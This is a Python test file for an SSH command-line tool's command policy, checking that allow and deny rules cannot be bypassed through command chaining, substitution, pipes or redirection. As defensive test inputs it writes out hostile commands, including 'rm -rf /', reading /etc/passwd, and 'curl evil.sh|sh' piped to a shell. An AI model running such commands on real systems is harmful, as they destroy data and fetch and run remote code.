"""store.Policy：命令策略语义与绕过回归。

对应 docs/DESIGN.md 的两条线（每段一个）：
- P0 策略语义：re.search → re.fullmatch，shell 元字符默认拒绝；
  外部评审给出的绕过写法（拼接 / 管道 / 替换 / 重定向 / 未锚定 allow）
  必须全部转红
- P1 I6：白名单主机的 test 探测在建连之前就被策略拒绝

运行：
    python tests/test_policy.py
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import _common  # noqa: E402  先注入路径、设环境，再 import scripts 下的模块

TMP = _common.init_data_dir("asshcli-policy-")

from _common import check, finish, reset  # noqa: E402
from lib import audit, paths, store, vault  # noqa: E402


def denied(policy: store.Policy, command: str, **kw) -> str | None:
    return policy.check(command, **kw)


class _NoConnectClient:
    """哨兵：test 在策略阶段就该被拒，绝不应该走到建连。"""

    def __init__(self, *a, **kw):
        raise AssertionError("策略拒绝发生在建连之前，Client 不应被构造")


def test_policy_bypass_cases() -> None:
    """P0：评审给出的四条绕过用例，全部必须转红。"""

    print("\n== deny 被 && / ; 绕过 ==")
    p = store.Policy(deny=[r"^rm -rf"])
    r = denied(p, "df -h && rm -rf /")
    check("df -h && rm -rf / 被拒", r is not None, str(r))
    r = denied(p, "cd /tmp; rm -rf /")
    check("cd /tmp; rm -rf / 被拒", r is not None, str(r))
    r = denied(p, "df -h\nrm -rf /")
    check("换行拼接被拒", r is not None, str(r))
    r = denied(p, "df -h | tee /tmp/x")
    check("管道被拒", r is not None, str(r))
    r = denied(p, "$(rm -rf /)")
    check("命令替换被拒", r is not None, str(r))
    r = denied(p, "`rm -rf /`")
    check("反引号被拒", r is not None, str(r))
    r = denied(p, "cat /etc/passwd > /tmp/x")
    check("重定向被拒", r is not None, str(r))
    r = denied(p, "cat < /etc/passwd")
    check("输入重定向被拒", r is not None, str(r))

    print("\n== allow 未锚定被 ; 绕过 ==")
    p = store.Policy(allow=["df -h"])
    check("df -h 本身放行", denied(p, "df -h") is None, str(denied(p, "df -h")))
    r = denied(p, "x; rm -rf /; df -h")
    check("x; rm -rf /; df -h 被拒", r is not None, str(r))
    r = denied(p, "df -h extra")
    check("fullmatch 不放过额外参数", r is not None, str(r))

    p = store.Policy(allow=[r"^systemctl status "])
    r = denied(p, "systemctl status x; curl evil.sh|sh")
    check("README 旧示例的绕过写法被拒", r is not None, str(r))

    print("\n== fullmatch 语义 ==")
    p = store.Policy(deny=[r"^rm -rf.*"])
    check("deny 覆盖整族命令", denied(p, "rm -rf /") is not None)
    check("allow_shell 下 deny 仍是 fullmatch",
          denied(p, "cd /tmp; rm -rf /", allow_shell=True) is None,
          "没写 .* 的规则不该命中整串")
    p = store.Policy(allow=[r"^df -h$"])
    check("^df -h$ 放行 df -h", denied(p, "df -h") is None)
    check("^df -h$ 不放过 df -h 2>/dev/null",
          denied(p, "df -h 2>/dev/null", allow_shell=True) is not None)
    p = store.Policy(deny=["shutdown"])
    check("字面规则只匹配整串", denied(p, "shutdown") is not None
          and denied(p, "shutdown -h now") is None)

    print("\n== allow_shell 放行元字符 ==")
    p = store.Policy()
    r = denied(p, "echo a && echo b", allow_shell=True)
    check("allow_shell 放行 &&", r is None, str(r))
    r = denied(p, "df -h 2>/dev/null", allow_shell=True)
    check("allow_shell 放行重定向", r is None, str(r))
    r = denied(p, "echo $HOME", allow_shell=True)
    check("allow_shell 放行 $", r is None, str(r))

    print("\n== 规则写坏不崩、不放开 ==")
    p = store.Policy(deny=["(unclosed"])
    try:
        r = denied(p, "ls -l")
        ok = True
    except Exception as exc:  # noqa: BLE001
        r, ok = None, False
        print(f"       异常：{exc}")
    check("非法正则不抛异常", ok)
    check("非法正则退化为字面比较", r is None, str(r))

    print("\n== allow_shell 写进 hosts.toml 并读回 ==")
    reset()
    store.upsert_host(store.Host(name="shellbox", host="1.2.3.4", user="root",
                                 allow_shell=True))
    raw = paths.hosts_file().read_text(encoding="utf-8")
    check("清单里有 allow_shell = true", "allow_shell = true" in raw, raw)
    h = store.get("shellbox")
    check("读回来是 True", h is not None and h.allow_shell is True, str(h))
    store.upsert_host(store.Host(name="plain", host="5.6.7.8", user="root"))
    h2 = store.get("plain")
    check("没写就是 False", h2 is not None and h2.allow_shell is False, str(h2))


def test_test_policy_gate() -> None:
    """P1 I6：白名单主机的 test 探测在策略阶段被拒，并写 test.denied 审计。"""
    from lib.transport import Client as RealClient
    from lib import transport

    import asshcli as cli

    print("\n== I6 白名单主机的 test 被拒 ==")
    reset()
    master = "p1-master-passphrase-1"
    os.environ["ASSHCLI_MASTER"] = master
    v = vault.Vault.create(paths.vault_file(), master)
    v.set("wl", "host-password-1")
    store.upsert_host(store.Host(name="wl", host="127.0.0.1", user="root",
                                 port=1))
    store.set_policy("wl", ["^df -h$"], [])

    transport.Client = _NoConnectClient
    try:
        code, _, err = _common.run_cli(["test", "wl"])
    finally:
        transport.Client = RealClient
    check("test 返回 1（策略拒绝）", code == 1, str(code))
    check("提示探测命令被策略拒绝", "探测命令被策略拒绝" in err, err)
    check("提示白名单模式如何验证连通", "白名单" in err and "run" in err, err)

    recs = [r for r in audit.tail(20)
            if str(r.get("action", "")).startswith("test")]
    check("写了 test.denied 审计",
          any(r.get("action") == "test.denied" for r in recs), str(recs))
    os.environ.pop("ASSHCLI_MASTER", None)


def main() -> int:
    test_policy_bypass_cases()
    test_test_policy_gate()
    return finish()


if __name__ == "__main__":
    sys.exit(main())
